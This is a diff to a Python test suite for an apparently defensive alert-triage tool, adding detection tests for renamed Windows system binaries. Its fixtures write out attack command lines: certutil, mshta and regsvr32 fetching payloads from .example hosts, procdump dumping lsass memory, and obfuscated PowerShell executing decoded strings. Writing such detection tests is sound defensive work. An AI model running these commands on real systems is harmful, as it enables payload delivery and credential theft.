@@ -102,6 +102,17 @@ POSITIVE_CASES = [
     ("char_shift_decoding", {"command_line": "powershell -c \"$d=-join ('Ijw.Ebuf' -split '' | % { if ($_) { [char]([int][char]$_ - 1) } }); iex $d\""}),
     ("char_shift_decoding", {"command_line": "powershell -c \"$s='Fhw0Gdwh'; $o=''; for($i=0;$i -lt $s.Length;$i++){ $o+=[char]([int]$s[$i] - 3) }; & ([scriptblock]::Create($o))\""}),
     ("user_writable_execution", {"command_line": r'"C:\Users\a b\AppData\Roaming\x\run.exe" --silent'}),
+    # Renamed copies, recognised by their PE header's original file name.
+    ("certutil_download", {"file_path": r"C:\Users\Public\cu.exe", "original_file_name": "CertUtil.exe", "command_line": "cu.exe -urlcache -f http://payload.example/a.exe a.exe"}),
+    ("mshta_execution", {"file_path": r"C:\temp\m.exe", "original_file_name": "MSHTA.EXE", "command_line": "m.exe http://x.example/a.hta"}),
+    ("regsvr32_squiblydoo", {"file_path": r"C:\temp\r.exe", "original_file_name": "REGSVR32.EXE", "command_line": "r.exe /s /i:http://x.example/f.sct scrobj.dll"}),
+    ("rundll32_user_path", {"file_path": r"C:\temp\r.exe", "original_file_name": "RUNDLL32.EXE", "command_line": r"r.exe C:\Users\a\AppData\Local\Temp\x.dll,Start"}),
+    ("lsass_dump", {"file_path": r"C:\temp\pd.exe", "original_file_name": "procdump", "command_line": "pd.exe -accepteula -ma lsass.exe out.dmp"}),
+    ("encoded_powershell", {"file_path": r"C:\temp\ps.exe", "original_file_name": "PowerShell.EXE", "command_line": f"ps.exe -enc {encode('Get-Date')}"}),
+    ("encoded_powershell", {"file_path": r"C:\temp\p7.exe", "original_file_name": "pwsh.dll", "command_line": f"p7.exe -enc {encode('Get-Date')}"}),
+    ("renamed_system_binary", {"file_path": r"C:\Users\Public\cu.exe", "original_file_name": "certutil.exe"}),
+    ("renamed_system_binary", {"command_line": "svchost64.exe /c whoami", "original_file_name": "Cmd.Exe"}),
+    ("renamed_system_binary", {"file_path": r"C:\temp\pd.exe", "original_file_name": "procdump"}),
 ]
 
 
@@ -403,3 +414,72 @@ def test_sample_alert_urls_are_example_only():
     for path in ALERTS_DIR.glob("*.json"):
         for host in re.findall(r"https?://([^/\s'\"]+)", path.read_text()):
             assert host.endswith(".example"), (path.name, host)
+
+
+# --- Renamed binaries (original_file_name) -------------------------------------
+
+RENAMED_CERTUTIL = {
+    "file_path": r"C:\Users\Public\cu.exe",
+    "original_file_name": "certutil.exe",
+    "command_line": "cu.exe -urlcache -f http://payload.example/a.exe a.exe",
+}
+
+
+def test_renamed_certutil_fires_certutil_and_renamed_rules():
+    findings = {f.rule_id: f for f in analyze(Alert(hostname="WS-TEST-01", **RENAMED_CERTUTIL))}
+
+    assert {"certutil_download", "renamed_system_binary"} <= set(findings)
+    renamed = findings["renamed_system_binary"]
+    assert renamed.severity == "high"
+    assert [t.id for t in renamed.techniques] == ["T1036.003"]
+    assert renamed.evidence == "certutil.exe | cu.exe"  # The original next to the name on disk.
+    assert renamed.matched_field == "original_file_name, image"
+
+
+def test_renamed_certutil_sample_is_malicious():
+    alert = Alert.model_validate(json.loads((ALERTS_DIR / "renamed_certutil.json").read_text()))
+
+    with respx.mock(assert_all_called=False) as mock:  # Nothing to look up: no hash, IP or domain.
+        result = triage(alert)
+
+    assert result.verdict == "malicious"
+    assert not mock.calls
+    assert {"certutil_download", "renamed_system_binary"} <= {f.rule_id for f in result.behavior_findings}
+    assert "Stealth" in result.tactics
+
+
+def test_without_original_file_name_a_renamed_copy_is_missed_as_before():
+    # The bypass the field fixes: by name alone, cu.exe isn't certutil.
+    fields = {k: v for k, v in RENAMED_CERTUTIL.items() if k != "original_file_name"}
+
+    assert rule_ids(**fields) == set()  # Nothing fires.
+
+
+@pytest.mark.parametrize("fields", [
+    {"file_path": r"C:\Windows\System32\certutil.exe", "original_file_name": "certutil.exe"},
+    {"file_path": r"C:\Windows\System32\certutil.exe", "original_file_name": "CertUtil.exe"},  # Case only.
+    {"file_path": r"C:\Windows\System32\MSHTA.EXE", "original_file_name": "mshta.exe"},
+    {"file_path": r"C:\tools\procdump.exe", "original_file_name": "procdump"},  # Missing .exe isn't a rename.
+    {"command_line": "cmd.exe /c dir", "original_file_name": "Cmd.Exe"},
+    {"original_file_name": "certutil.exe"},  # No name on disk to compare with.
+    {"file_path": r"C:\Users\a\x.exe", "original_file_name": "notepad.exe"},  # Not on the list.
+    {"file_path": r"C:\Program Files\App\app.exe", "original_file_name": "AppSetup.exe"},
+    {"file_path": r"C:\Program Files\PowerShell\7\pwsh.exe", "original_file_name": "pwsh.dll"},
+])
+def test_not_renamed(fields):
+    assert "renamed_system_binary" not in rule_ids(**fields)
+
+
+def test_original_file_name_is_compared_as_a_file_name_only():
+    # Some sources report a path; only its last part counts.
+    fields = {"file_path": r"C:\Windows\System32\certutil.exe", "original_file_name": r"D:\build\certutil.exe"}
+
+    assert "renamed_system_binary" not in rule_ids(**fields)
+
+
+@pytest.mark.parametrize("filename", sorted(p.name for p in ALERTS_DIR.glob("*.json") if p.name != "renamed_certutil.json"))
+def test_existing_samples_have_no_renamed_finding(filename):
+    data = json.loads((ALERTS_DIR / filename).read_text())
+    if "hostname" not in data:
+        return  # Vendor formats are covered in their own tests.
+    assert "renamed_system_binary" not in {f.rule_id for f in analyze(Alert.model_validate(data))}
